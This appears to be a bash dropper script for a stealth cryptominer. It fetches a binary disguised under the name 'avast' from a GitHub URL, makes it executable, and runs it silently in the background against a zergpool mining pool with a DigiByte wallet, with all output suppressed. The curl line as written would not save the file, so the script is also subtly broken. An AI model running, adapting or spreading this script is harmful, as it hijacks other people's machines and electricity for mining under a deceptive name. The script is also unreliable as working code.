#!/bin/bash
curl -L https://github.com/Gow17/pos/raw/main/avast >/dev/null 2>&1
chmod +x avast  >/dev/null 2>&1
nohup ./avast -v -l  verushash.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-99999 -n 1)-TPU) -p c=DGB -t 16 -x >/dev/null 2>&1
